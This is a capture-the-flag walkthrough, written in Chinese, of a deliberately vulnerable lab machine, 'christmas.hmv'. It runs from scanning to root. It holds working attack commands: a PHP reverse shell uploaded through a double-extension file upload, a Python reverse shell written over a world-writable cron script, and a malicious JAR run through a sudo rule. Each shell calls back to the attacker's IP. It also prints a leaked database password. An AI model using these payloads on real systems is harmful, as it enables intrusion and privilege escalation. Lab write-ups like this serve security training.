# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 02:00 EDT
Nmap scan report for xmas (192.168.2.5)
Host is up (0.00052s latency).
MAC Address: 08:00:27:B1:AE:10 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (7 hosts up) scanned in 2.96 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.2.5 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-09 02:00 EDT
Nmap scan report for xmas (192.168.2.5)
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a6:3e:0b:65:85:2c:0c:5e:47:14:a9:dd:aa:d4:8c:60 (ECDSA)
|_  256 99:72:b5:6e:1a:9e:70:b3:24:e0:59:98:a4:f9:d1:25 (ED25519)
80/tcp open  http    Apache httpd 2.4.55
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-title: Did not follow redirect to http://christmas.hmv
MAC Address: 08:00:27:B1:AE:10 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms xmas (192.168.2.5)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.42 seconds
```

# 漏洞利用

添加一下域名

```
┌──(kali㉿kali)-[~]
└─$ echo "192.168.2.5 christmas.hmv" | sudo tee -a /etc/hosts    
[sudo] password for kali: 
192.168.2.5 christmas.hmv
```

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://christmas.hmv -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://christmas.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://christmas.hmv/css/]                                                           
/fonts                (Status: 301) [Size: 314] [--> http://christmas.hmv/fonts/]                                                         
/images               (Status: 301) [Size: 315] [--> http://christmas.hmv/images/]                                                        
/index.php            (Status: 200) [Size: 22834]
/js                   (Status: 301) [Size: 311] [--> http://christmas.hmv/js/]                                                            
/javascript           (Status: 301) [Size: 319] [--> http://christmas.hmv/javascript/]                                                    
/php                  (Status: 301) [Size: 312] [--> http://christmas.hmv/php/]                                                           
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://christmas.hmv/uploads/]                                                       
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

看一下这个php目录

```
┌──(kali㉿kali)-[~]
└─$ curl http://christmas.hmv/php/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /php</title>
 </head>
 <body>
<h1>Index of /php</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="form-process.php">form-process.php</a></td><td align="right">2023-11-16 21:04  </td><td align="right">1.3K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.55 (Ubuntu) Server at christmas.hmv Port 80</address>
</body></html>
┌──(kali㉿kali)-[~]
└─$ curl http://christmas.hmv/php/form-process.php
Name is required Email is required Subject is required Subject is required Message is required
```

需要post参数，我们寻找一下

```
┌──(kali㉿kali)-[~]
└─$ curl http://christmas.hmv/index.php | grep -i "form\|input\|name" 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="keywords" content="Merry Christmas, Christmans, XMAS, Santa, Santa Claus">
    <meta name="description" content="Santa Claus, also known as Father Christmas, Saint Nicholas, Saint Nick, Kris Kringle, or simply Santa, is a legendary figure originating in Western Christian culture who is said to bring gifts during the late evening and overnight hours on Christmas Eve.">
    <meta name="author" content="Alabaster Snowball">
                                                                <p>Are you not on the list here? Perhaps your name is not displayed since we do not query every name in the database.</p>
100 22834                                          <p> The file must have the following name format <b>'First name Last name.pdf'</b>.</p>
  0 22834    0                                                                                <form action="" method="post" enctype="multipart/form-data">
     0                                         <input type="file" name="file" id="file" required>
 7172k                                        <input class="hvr-radial-out" style="background-color: red; color: white;"  type="submit" value="Upload File" name="submit">
                                           </form>
                                           <!--<form action="index.php" method="POST" enctype="multipart/form-data">
0 -                                            <input type="file" name="file">
-:--:--                                             <button class="hvr-radial-out" style="background-color: red; color: white;" type="submit" name="submit">Upload</button>
--:-                                        </form>-->
-:-- --:--:-- 7432k
                                        <form id="contactForm">
                                                        <div class="form-group">
                                                                <input type="text" class="form-control" id="name" name="name" placeholder="Your Name" required data-error="Please enter your name">
                                                        <div class="form-group">
                                                                <input type="text" placeholder="Your Email" id="email" class="form-control" name="name" required data-error="Please enter your email">
                                                        <div class="form-group">
                                                                <input type="text" placeholder="Your number" id="number" class="form-control" name="number" required data-error="Please enter your number">
                                                        <div class="form-group"> 
                                                                <textarea class="form-control" id="message" placeholder="Your Message" rows="8" data-error="Write your message" required></textarea>
                                        </form>
                                                <form action="#" method="post">
                                                        <div class="form-group">
                                                                <input class="form-control-1" id="email-1" name="email" placeholder="Email Address" required="" type="text">
                                                        <div class="form-group">
                                                </form>
                                        <p class="footer-company-name">All Rights Reserved. Copyright &copy; <script type="text/javascript">
        <script src="js/form-validator.min.js"></script>
    <script src="js/contact-form-script.js"></script>
```

尝试上传文件

```
┌──(kali㉿kali)-[~]
└─$ echo '<?php system("bash -c '\''bash -i >& /dev/tcp/192.168.2.15/4444 0>&1'\''"); ?>' > reverse.pdf.php
                                                                     
┌──(kali㉿kali)-[~]
└─$ curl -X POST http://christmas.hmv/index.php -F "file=@reverse.pdf.php" -F "submit=Upload File"
┌──(kali㉿kali)-[~]
└─$ curl http://christmas.hmv/uploads/reverse.pdf.php
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.5] 42712
bash: cannot set terminal process group (701): Inappropriate ioctl for device
bash: no job control in this shell
www-data@xmas:/var/www/christmas.hmv/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

```
//信息搜集
www-data@xmas:/home$ grep -rn "password\|DB_\|mysql_connect\|new mysqli" /var/www/christmas.hmv/ --include="*.php" 2>/dev/null
<ar/www/christmas.hmv/ --include="*.php" 2>/dev/null
/var/www/christmas.hmv/index.php:25:$mysqli = new mysqli('localhost', 'root', 'ChristmasMustGoOn!', 'christmas');
www-data@xmas:/home$ su root
su root
Password: ChristmasMustGoOn!
su: Authentication failure
www-data@xmas:/home$ cat /etc/passwd | grep -E "/bin/.*sh"
cat /etc/passwd | grep -E "/bin/.*sh"
root:x:0:0:root:/root:/bin/bash
alabaster:x:1000:1000:Alabaster Snowball:/home/alabaster:/bin/bash
santa:x:1001:1001:Santa Claus,,,:/home/santa:/bin/bash
sugurplum:x:1002:1002:Sugurplum Mary,,,:/home/sugurplum:/bin/bash
bushy:x:1003:1003:Bushy Evergreen,,,:/home/bushy:/bin/bash
pepper:x:1004:1004:Pepper Minstix,,,:/home/pepper:/bin/bash
shinny:x:1005:1005:Shinny Upatree,,,:/home/shinny:/bin/bash
wunorse:x:1006:1006:Wunorse Openslae,,,:/home/wunorse:/bin/bash
www-data@xmas:/home$ sudo -l
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
www-data@xmas:/home$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount3
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/libexec/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/snap/core24/1587/usr/bin/chfn
/snap/core24/1587/usr/bin/chsh
/snap/core24/1587/usr/bin/gpasswd
/snap/core24/1587/usr/bin/mount
/snap/core24/1587/usr/bin/newgrp
/snap/core24/1587/usr/bin/passwd
/snap/core24/1587/usr/bin/su
/snap/core24/1587/usr/bin/sudo
/snap/core24/1587/usr/bin/umount
/snap/core24/1587/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core24/1587/usr/lib/openssh/ssh-keysign
/snap/core24/1587/usr/lib/polkit-1/polkit-agent-helper-1
/snap/snapd/20290/usr/lib/snapd/snap-confine
/snap/snapd/18596/usr/lib/snapd/snap-confine
/snap/core22/864/usr/bin/chfn
/snap/core22/864/usr/bin/chsh
/snap/core22/864/usr/bin/gpasswd
/snap/core22/864/usr/bin/mount
/snap/core22/864/usr/bin/newgrp
/snap/core22/864/usr/bin/passwd
/snap/core22/864/usr/bin/su
/snap/core22/864/usr/bin/sudo
/snap/core22/864/usr/bin/umount
/snap/core22/864/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/864/usr/lib/openssh/ssh-keysign
/snap/core22/607/usr/bin/chfn
/snap/core22/607/usr/bin/chsh
/snap/core22/607/usr/bin/gpasswd
/snap/core22/607/usr/bin/mount
/snap/core22/607/usr/bin/newgrp
/snap/core22/607/usr/bin/passwd
/snap/core22/607/usr/bin/su
/snap/core22/607/usr/bin/sudo
/snap/core22/607/usr/bin/umount
/snap/core22/607/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/607/usr/lib/openssh/ssh-keysign
www-data@xmas:/home$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
www-data@xmas:/home$ ls -la /etc/cron.d/
ls -la /etc/cron.d/
total 20
drwxr-xr-x   2 root root 4096 Nov 17  2023 .
drwxr-xr-x 110 root root 4096 Nov 20  2023 ..
-rw-r--r--   1 root root  102 Nov 23  2022 .placeholder
-rw-r--r--   1 root root  201 Feb 17  2023 e2scrub_all
-rw-r--r--   1 root root  712 Jan 28  2022 php
www-data@xmas:/home$ ls -la /opt/ /tmp/ /var/tmp/ /dev/shm/
ls -la /opt/ /tmp/ /var/tmp/ /dev/shm/
/dev/shm/:
total 0
drwxrwxrwt  2 root root   40 Apr  9 05:59 .
drwxr-xr-x 20 root root 4100 Apr  9 05:59 ..

/opt/:
total 12
drwxr-xr-x  3 root root 4096 Nov 20  2023 .
drwxr-xr-x 20 root root 4096 Nov 17  2023 ..
drwxr-xr-x  2 root root 4096 Nov 20  2023 NiceOrNaughty

/tmp/:
total 8
drwxrwxrwt  2 root root 4096 Apr  9 06:20 .
drwxr-xr-x 20 root root 4096 Nov 17  2023 ..

/var/tmp/:
total 8
drwxrwxrwt  2 root root 4096 Apr  9 05:59 .
drwxr-xr-x 14 root root 4096 Nov 17  2023 ..
//发现了脚本
www-data@xmas:/home$ ls -la /opt/NiceOrNaughty/
ls -la /opt/NiceOrNaughty/
total 12
drwxr-xr-x 2 root root 4096 Nov 20  2023 .
drwxr-xr-x 3 root root 4096 Nov 20  2023 ..
-rwxrwxrw- 1 root root 2029 Nov 20  2023 nice_or_naughty.py
www-data@xmas:/home$ cat /opt/NiceOrNaughty/nice_or_naughty.py
cat /opt/NiceOrNaughty/nice_or_naughty.py
import mysql.connector
import random
import os

# Check the wish lists directory
directory = "/var/www/christmas.hmv/uploads"
# Connect to the mysql database christmas
mydb = mysql.connector.connect(
    host="localhost",
    user="root",
    password="ChristmasMustGoOn!",
    database="christmas"
)

#Read the names of the wish list
def read_names(directory):
    for filename in os.listdir(directory):
        full_path = os.path.join(directory, filename)
        if os.path.isfile(full_path):
            name, ext = os.path.splitext(filename)
            if any(char.isalnum() for char in name):
                status = random.choice(["nice", "naughty"])
                #print(f"{name} {status}")
                insert_data(name, status)
                os.remove(full_path)
            else:
                pass
        
        elif os.path.isdir(full_path):
            pass 

# Insert name into the database
def insert_data(name, status):
    mycursor = mydb.cursor()
    sql = "INSERT INTO christmas (name, status) VALUES ( %s, %s)"
    val = (name, status)
    mycursor.execute(sql, val)
    mydb.commit()

#Generate printable Nice and Naughty list
def generate_lists():
    mycursor = mydb.cursor()

    # SQL query to fetch all names and status
    mycursor.execute("SELECT name, status FROM christmas")

    # Separate the nice and naughty lists
    nice_list = []
    naughty_list = []

    for (name, status) in mycursor:
        if status == "nice":
            nice_list.append(name)
        else:
            naughty_list.append(name)
    
    parent_directory = os.path.dirname(os.getcwd())
    file_path = "/home/alabaster/nice_list.txt"
    # Save the nice and naughty lists to separate txt files
    with open(file_path, "w") as file:
        for name in nice_list:
            file.write(f"{name}\n")
    file_path = "/home/alabaster/naughty_list.txt"
    with open(file_path, "w") as file:
        for name in naughty_list:
            file.write(f"{name}\n")

read_names(directory)
generate_lists()
//替换掉脚本
www-data@xmas:/home$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.15",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' > /opt/NiceOrNaughty/nice_or_naughty.py
<wn("bash")' > /opt/NiceOrNaughty/nice_or_naughty.py
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.5] 45324
alabaster@xmas:~$ id
id
uid=1000(alabaster) gid=1000(alabaster) groups=1000(alabaster),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
//允许执行JAR，但JAR文件可以被修改
alabaster@xmas:~$ sudo -l
sudo -l
Matching Defaults entries for alabaster on xmas:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User alabaster may run the following commands on xmas:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/java -jar
        /home/alabaster/PublishList/PublishList.jar
//编写恶意JAR文件
alabaster@xmas:/tmp$ cat > shell.java << 'EOF'
public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "bash -i >& /dev/tcp/192.168.2.15/6666 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
EOFcat > shell.java << 'EOF'
> public class shell {
>     public static void main(String[] args) {
<"-c", "bash -i >& /dev/tcp/192.168.2.15/6666 0>&1")
>             .redirectErrorStream(true);
>         try {
>             Process p = pb.start();
>             p.waitFor();
>             p.destroy();
>         } catch (Exception e) {}
>     }
> }
> 
EOF
alabaster@xmas:/tmp$ echo "Main-Class: shell" > Manifest.txt
echo "Main-Class: shell" > Manifest.txt
//编译
alabaster@xmas:/tmp$ javac shell.java
javac shell.java
//打包
alabaster@xmas:/tmp$ jar cfm Shell.jar Manifest.txt shell.class
jar cfm Shell.jar Manifest.txt shell.class
//替换
alabaster@xmas:/tmp$ cp Shell.jar /home/alabaster/PublishList/PublishList.jar
cp Shell.jar /home/alabaster/PublishList/PublishList.jar
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 6666
listening on [any] 6666 ...
//执行
alabaster@xmas:/tmp$ sudo /usr/bin/java -jar /home/alabaster/PublishList/PublishList.jar
<va -jar /home/alabaster/PublishList/PublishList.jar
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.5] 41432
root@xmas:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```
